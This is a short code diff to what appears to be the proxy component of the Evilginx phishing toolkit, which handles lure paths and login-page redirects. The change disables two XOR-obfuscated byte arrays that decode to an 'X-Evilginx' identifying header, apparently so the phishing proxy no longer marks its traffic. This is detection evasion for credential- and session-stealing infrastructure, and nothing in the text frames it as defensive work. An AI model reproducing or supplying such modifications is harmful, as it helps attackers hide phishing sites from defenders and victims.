@@ -347,7 +347,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
+				//hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
+				hg := []byte{0x00}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -559,7 +560,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				//e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				e := []byte{00}
 				for n, b := range e {
 					e[n] = b ^ 0x88
 				}
